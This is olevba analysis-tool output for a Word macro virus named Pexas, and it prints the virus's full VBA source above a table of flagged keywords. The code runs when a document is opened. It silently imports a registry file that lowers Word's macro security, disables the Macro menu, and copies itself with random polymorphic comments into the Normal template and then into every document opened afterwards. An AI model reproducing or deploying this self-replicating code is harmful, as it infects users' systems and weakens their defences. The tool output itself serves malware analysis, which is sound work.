olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pexas
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pexas - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Open()
'<XasPerant> Virus by MI_pirat
'XP-only virus (10q Bill 4 a great Office...NOT)
On Error Resume Next
StatusBar = Chr(72) + Chr(111) + Chr(114) + Chr(82) + Chr(79) + Chr(114)
zi = Day(Date)
If zi = 29 Then
MsgBox Chr(72) + Chr(111) + Chr(114) + Chr(82) + Chr(79) + Chr(114) + Chr(32) + Chr(82) + Chr(79) + Chr(99) + Chr(107) + Chr(122), vbInformation, Chr(72) + Chr(111) + Chr(114) + Chr(82) + Chr(79) + Chr(114)
Application.Quit (False)
End If
'DRINK (TM)... Motto: "DRINKDRINKDRINK" !!!
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "XP") <> "inXP" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "XP") = "inXP"
Options.SaveNormalPrompt = 5 Xor 5
Open "C:\a.reg" For Output As #1
Print #1, "REGEDIT4"
Print #1, ""
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security]"
Print #1, """Level"" = dword:00000001"
Close #1
Shell "C:\Windows\regedit /s C:\a.reg"
Kill "C:\a.reg"
CommandBars(Chr(84) + Chr(111) + Chr(111) + Chr(108) + Chr(115)).Controls(Chr(77) + Chr(97) + Chr(99) + Chr(114) + Chr(111)).Enabled = (1 Xor 1)
Randomize
nr = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
Set myTemplate = Templates(1)
myTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, myTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
myTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "Sub Document_Close"
For i = 2 To nr
xxx = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)
poly = Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32))
strn = xxx + " '" + poly
myTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines i, strn
Next i
Documents.Open FileName:=myTemplate.FullName, ConfirmConversions:=False, ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:="", PasswordTemplate:="", Revert:=False, WritePasswordDocument:="", WritePasswordTemplate:="", Format:=wdOpenFormatAuto
ActiveDocument.Save
ActiveDocument.Close
End If
For Each aVar In ActiveDocument.Variables
    If aVar.Name = "xp" Then num = aVar.Index
Next aVar
If (num = 0) And (NormalTemplate.FullName <> ActiveDocument.FullName) Then
ActiveDocument.Variables.Add Name:="xp"
ActiveDocument.Variables("xp").Value = 1
Set myTemplate = Templates(1)
nr = myTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "Sub Document_Open"
For i = 2 To nr
s = myTemplate.VBProject.VBComponents(1).CodeModule.Lines(i, 1)
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines i, s
Next i
ActiveDocument.Save
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |a.reg               |Executable file name                         |
+----------+--------------------+---------------------------------------------+

